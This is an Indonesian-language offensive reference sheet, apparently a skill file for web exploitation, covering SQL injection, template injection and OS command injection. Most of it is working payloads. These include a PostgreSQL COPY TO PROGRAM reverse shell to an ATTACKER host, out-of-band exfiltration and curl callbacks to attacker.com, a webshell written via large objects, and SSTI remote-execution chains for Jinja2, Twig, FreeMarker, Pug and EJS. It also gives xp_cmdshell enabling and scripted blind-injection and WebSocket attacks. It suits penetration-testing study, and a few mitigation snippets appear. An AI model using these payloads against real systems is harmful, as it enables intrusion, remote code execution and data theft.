---
name: "Injection Attacks — SQLi, SSTI & OS Command Injection"
description: "Blind SQL injection (error, time, OOB), ORM injection, PostgreSQL COPY TO PROGRAM, SSTI per engine dengan gerbang versi (Jinja2/Twig/FreeMarker/Handlebars/EJS/Pug), OS command injection, WebSocket, dan RCE via database — beserta prasyarat dan klaim yang tidak boleh dibuat."
tags: [oswe, sqli, ssti, os-command-injection, postgresql, jinja2, websocket, rce, orm-injection]
---

> Payload di bawah adalah bentuk dasar, belum tentu lolos WAF. Bila ada CRS/Coraza atau filter aplikasi, kanal dan encoding yang dipilih harus berasal dari pembacaan kode — lihat [waf-bypass-payloads.md](./waf-bypass-payloads.md).

## SQL Injection Advanced

### Blind SQL Injection — Error-Based

```sql
-- MySQL error-based via double query
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) a) --

-- PostgreSQL error-based
' OR CAST((SELECT version()) AS numeric) --

-- MSSQL error-based
' OR 1/@@servername --
```

### Blind SQL Injection — Time-Based

```python
import requests, time

TARGET = "http://target/api/users?id="

def baseline():
    samples = []
    for _ in range(3):
        start = time.time(); requests.get(TARGET + "1"); samples.append(time.time() - start)
    return max(samples)

def test_time_based(payload, threshold):
    start = time.time()
    requests.get(TARGET + payload)
    return time.time() - start > threshold

# MySQL: SLEEP(5) | PostgreSQL: pg_sleep(5) | MSSQL: WAITFOR DELAY '0:0:5'
# Bandingkan dengan baseline; satu kali delay bukan bukti.
```

### Out-of-Band (OOB) SQL Injection

```sql
-- MySQL OOB (butuh FILE + secure_file_priv)
' LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.attacker.com\\test')) --

-- PostgreSQL OOB via COPY
' COPY (SELECT version()) TO PROGRAM 'nslookup $(cat /etc/hostname).attacker.com' --

-- MSSQL OOB via xp_dirtree
' EXEC master..xp_dirtree '\\attacker.com\share' --
```

### ORM Injection

```java
// Hibernate HQL Injection — unsafe string concatenation
String hql = "FROM users WHERE username = '" + input + "'";
Query query = session.createQuery(hql);

// JPA Criteria API — safe
CriteriaBuilder cb = em.getCriteriaBuilder();
CriteriaQuery<User> cq = cb.createQuery(User.class);
Root<User> root = cq.from(User.class);
cq.where(cb.equal(root.get("username"), input));
```

```csharp
// Entity Framework — unsafe
var users = context.Users.FromSqlRaw($"SELECT * FROM Users WHERE username = '{input}'").ToList();

// Entity Framework — safe
var users = context.Users.FromSqlRaw("SELECT * FROM Users WHERE username = @p0", input).ToList();
```

Binding tidak menolong pada **identifier**: `ORDER BY`, nama kolom, `LIMIT`, nama tabel. Developer biasanya mengalihkan bagian itu ke konkatenasi — di situlah injeksi tanpa kutip muncul.

### PostgreSQL: COPY TO PROGRAM

```sql
-- RCE via COPY TO PROGRAM (PostgreSQL 9.3+); butuh superuser atau role
-- pg_execute_server_program, dan shell berjalan sebagai user OS database.
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/443 0>&1"'; --

-- Tulis webshell via large object; butuh superuser (lo_* server-side)
'; SELECT lo_from_bytea(0, decode('3c3f706870...','hex')); --
'; SELECT lo_export(12345, '/var/www/html/shell.php'); --
```

`COPY ... FROM PROGRAM` membaca output perintah ke tabel — arahnya berlawanan dengan `TO PROGRAM` dan bukan yang dipakai untuk reverse shell.

---

## Server-Side Template Injection (SSTI)

SSTI terjadi bila input user menjadi **source template**, bukan data: `render("Dear " + x)` rentan; `render(tpl, {name: x})` tidak.

### Detection

| Probe | Output | Engine |
|---|---|---|
| `{{7*7}}` | `49` | Jinja2, Twig, Nunjucks; Handlebars **tidak** mengevaluasi (logic-less) |
| `{{7*'7'}}` | `7777777` | Jinja2 (string × int) |
| `{{7*'7'}}` | `49` | Twig (cast PHP) — pembeda utama |
| `${7*7}` | `49` | FreeMarker, Mako, JSP/JSF EL, Thymeleaf |
| `#{7*7}` | `49` | Pug/Jade, Ruby, JSF EL |
| `<%= 7*7 %>` | `49` | EJS, ERB |
| `#set($x=7*7)$x` | `49` | Velocity (`${7*7}` di Velocity literal) |
| `{if 7*7==49}Y{/if}` | `Y` | Smarty |
| `@(7*7)` | `49` | Razor |
| `${{<%[%'"}}%\` | error/500 | sinyal awal SSTI (fuzzing delimiter) |

`*{7*7}` bukan probe Thymeleaf yang valid — itu selection expression, bukan aritmetika **[UNVERIFIED]**.

### Jinja2 (Python)

`lipsum`, `cycler`, `namespace` adalah global Jinja2; `config`, `request`, `session` hanya ada di Flask. Indeks `__subclasses__()[N]` tidak portabel — loop dan cocokkan `__name__`.

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}

{% for c in ().__class__.__base__.__subclasses__() %}
  {% if 'Popen' in c.__name__ %}{{ c('id', shell=True, stdout=-1).communicate() }}{% endif %}
{% endfor %}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}   {# Flask-only #}
```

### Twig (PHP)

Gerbang versi: `_self.env` dihapus di **2.0.0**; filter `map`/`filter` ditambahkan **2.10.0**; **2.13.1** membatasi callable filter menjadi closure.

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}   {# 1.x saja #}
{{['id']|map('system')|join}}       {# >= 2.10 #}
{{['id']|filter('system')}}         {# 2.x; batas callable berlaku sejak 2.13.1 #}
```

### FreeMarker (Java)

`?new` dibatasi oleh `Configuration.setNewBuiltinClassResolver` (dapat direstriksi sejak **2.3.17**), bukan otomatis mati di versi baru. `?api` default `false` sejak **2.3.22**. Resolver efektif bergantung `incompatible_improvements` **[UNVERIFIED]**.

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")}
```

### Jade/Pug, EJS, Handlebars (Node.js)

```javascript
// Pug
#{root = this}
#{root.process.mainModule.require('child_process').execSync('id')}
- var x = global.process.mainModule.require('child_process').execSync('id')
= x

// EJS
<%= 7*7 %>
<%= global.process.mainModule.require('child_process').execSync('id') %>

// Handlebars — {{7*7}} tidak dievaluasi; rantai konstruktor butuh akses constructor
// Gerbang: CVE-2019-19919 (< 4.3.0), CVE-2021-23369 (< 4.7.7); akses prototype
// ditolak default sejak 4.6.0 [UNVERIFIED angka versi]
```

EJS CVE-2022-29078 (3.1.6) dieksekusi saat kompilasi lewat `settings[view options][outputFunctionName]` — kelasnya SSTI, bukan prototype pollution.

### SSTI Mitigation

```python
# RENTAN: input menjadi sumber template
from flask import render_template_string
return render_template_string("Hello " + user_input)

# AMAN: input hanya data
from flask import render_template
return render_template('user.html', name=name)
```

Catatan: `render_template_string(f"Hello {{name}}", name=name)` menyesatkan — f-string menghasilkan literal `{name}`, bukan ekspresi template.

---

## OS Command Injection & WebSocket

### Command Injection Patterns

```python
# Common injection characters
chars = [';', '|', '&', '&&', '||', '`', '$()', '\n', '%0a']

# Linux: ;, |, &&, ||, `command`, $(command)
# Windows: &, |, &&, ||, %command%

# Blind command injection with time delay
# Linux: ; sleep 5
# Windows: & ping -n 5 127.0.0.1 &
```

### Command Injection via WebSocket

```python
import websocket, json

TARGET_WS = "wss://target/ws/execute"

def websocket_cmd_inject(command):
    ws = websocket.WebSocket()
    ws.connect(TARGET_WS)
    payload = {
        "type": "command",
        "cmd": "ping",
        "host": f"127.0.0.1; {command}"  # Injection point
    }
    ws.send(json.dumps(payload))
    response = ws.recv()
    ws.close()
    return response
```

### Command Injection via HTTP Headers

```python
import requests
headers = {
    "User-Agent": "'; curl http://attacker.com/$(whoami); '",
    "X-Forwarded-For": "127.0.0.1; id"
}
r = requests.get(TARGET, headers=headers)
```

### RCE via Database Functions

```sql
-- PostgreSQL: UDF dari libc (teknik lama; rapuh terhadap versi/ABI — [UNVERIFIED] untuk rilis modern)
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('id');

-- H2 (embedded, JVM): CREATE ALIAS mengompilasi source Java saat runtime
'; CREATE ALIAS IF NOT EXISTS shell AS $$ String shell(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return ""; }$$; CALL shell('id'); --

-- HSQLDB: hanya memanggil static method yang sudah ada di classpath
CREATE ALIAS ABS FOR "java.lang.Math.abs";

-- MSSQL: butuh sysadmin, xp_cmdshell nonaktif secara default
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL: sys_eval/sys_exec BUKAN bawaan; berasal dari UDF pihak ketiga (lib_mysqludf_sys)
SELECT sys_eval('id');   -- hanya bila UDF sudah dipasang dan plugin_dir writable
```

Batas yang harus disebut: `COPY TO PROGRAM`, `xp_cmdshell`, `lo_*`, dan `CREATE ALIAS` bergantung hak akses DB; RCE tanpa output perintah, berkas yang bisa di-GET, atau callback OOB masih berstatus dugaan. Stacked query bergantung driver (`allowMultiQueries`, `multi_query`, `MYSQL_ATTR_MULTI_STATEMENTS`), bukan hanya DBMS.

## Rujukan

- [waf-bypass-payloads.md](./waf-bypass-payloads.md) — payload lolos filter/WAF.
- [java-web-exploitation.md](./java-web-exploitation.md) — XXE, H2/HSQLDB, EL/OGNL.
- [ssrf-internal-chains.md](./ssrf-internal-chains.md) — SSRF ke metadata dan layanan internal.
- [waf-evasion-methodology](../../waf-evasion-methodology/SKILL.md) — metodologi evasion black-box.
